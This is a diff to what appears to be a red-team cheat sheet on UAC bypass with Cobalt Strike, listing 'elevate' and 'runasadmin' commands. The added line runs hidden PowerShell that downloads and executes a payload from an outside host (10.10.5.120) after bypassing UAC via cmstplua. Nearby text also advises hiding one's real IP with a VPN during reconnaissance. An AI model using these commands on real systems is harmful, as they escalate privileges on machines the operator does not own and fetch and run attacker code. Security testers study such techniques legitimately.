@@ -223,6 +223,7 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 3. Also you can verify it by typing commands ``shell whoami /groups`` and ``shell whoami /priv``. You must be in **admin** group e.g. **BUILTIN\Administrators**
 4. Two methods are provided by **CS** for this **UAC Bypass** i.e. **elevate** and **runasadmin**
 5. in cobalt strike type: `elevate uac-token-duplication <your listner name>` e.g. ``elevate uac-token-duplication my1st64bit``
+6. in cobalt strike type: `runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"`
 
 ### Miscellaneous good points
 1. While doing active reconnisane, use VPN to hide the real Public IP address. 
